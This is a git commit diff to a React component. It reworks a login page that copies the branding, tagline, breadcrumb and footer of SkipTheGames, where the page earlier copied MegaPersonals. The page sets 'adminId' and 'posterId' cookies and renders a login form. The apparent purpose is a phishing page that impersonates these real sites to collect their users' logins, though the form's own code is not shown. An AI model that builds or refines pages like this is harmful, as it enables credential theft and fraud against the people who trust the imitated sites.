566215a16b29ebd32adb7261ef79a6e42382c2f0
shovonroy173 <shovonroy2003@gmail.com>
2025-04-14 17:09:21 +0600

    mod: home page ui update

--- app/components/Home.js
+++ app/components/Home.js
@@ -6,26 +6,64 @@ export default function Home({ adminId, posterId }) {
   Cookies.set("adminId", adminId);
   Cookies.set("posterId", posterId);
   return (
-    <div className="container pt-[35px] flex flex-col items-center overflow-x-hidden">
-      <div className="w-[65%] lg:w-full">
-        <img src="/images/megapersonals.png" alt="megaeprsonals" priority />
+<div className="">
+      {/* header */}
+      <div className="">
+        <div className="container pt-[10px] pb-8 flex flex-col  items-center lg:flex-row lg:justify-between">
+          <div className="lg:self-start mt-[3px] lg:mt-0">
+            <Image src={Logo} alt="logo" priority />
+          </div>
+
+          <p className="lg:self-end mt-[8px] lg:mt-[20px] text-custom-gray text-lg text-center font-medium  px-[75px] lg:px-0">
+            Skip the{" "}
+            <span className="block lg:inline-block">
+              games.Get satisfaction.
+            </span>
+          </p>
+
+          <button className="lg:self-end mt-2 lg:mt-0 bg-custom-rose hover:bg-custom-rose2 text-white font-bold px-10 lg:px-[90px] py-[8px] rounded transition duration-300">
+            Post your free ad now
+          </button>
+        </div>
       </div>
+
+      {/* route */}
+      <div className="shadow-inner-custom">
+        <div className="container py-[18px] lg:py-[22px] px-4 lg:px-0 flex items-center gap-2 text-[11px]">
+          <p className="">SKIPTHEGAMES.COM</p>
+          <span className="text-custom-cyan">»</span>
+          {/* <span className="text-custom-cyan">&#187;</span> */}
+          <p className="text-custom-cyan">LOGIN</p>
+        </div>
+      </div>
+
 
       <LoginForm adminId={adminId} posterId={posterId} />
 
-      <div className="mt-[24px] flex gap-1 text-[13px] text-custom-blue2">
-        <p className=" cursor-pointer">Home</p>
-        {" | "}
-        <p className=" cursor-pointer">Manage Posts</p>
-        {" | "}
-        <p className=" cursor-pointer">Contact Us</p>
-        {" | "}
-        <p className=" cursor-pointer">Policies & Terms</p>
+     {/* footer */}
+     <div className="container px-4 lg:px-0">
+        <div className="py-[20px] flex lg:justify-between text-custom-gray border-t border-slate-300">
+          <div className="">
+            <p className="cursor-pointer hover:text-custom-gray2">
+              ©skipthegames.com
+            </p>
+          </div>
+          <div className="flex flex-wrap gap-2 lg:gap-[22px]">
+            {[
+              "Home",
+              "Contact",
+              "About",
+              "Privacy",
+              "Terms",
+              "Escort Info",
+            ].map((link, i) => (
+              <div key={i} className="first:text-custom-gray  text-custom-cyan">
+                <p className="cursor-pointer hover:text-custom-gray2">{link}</p>
+              </div>
+            ))}
+          </div>
+        </div>
       </div>
-
-      <p className="mt-[5px] text-[13px] text-custom-blue2 tracking-wide">
-        Copyright ©2021 MegaPersonals.eu
-      </p>
     </div>
   );
 }
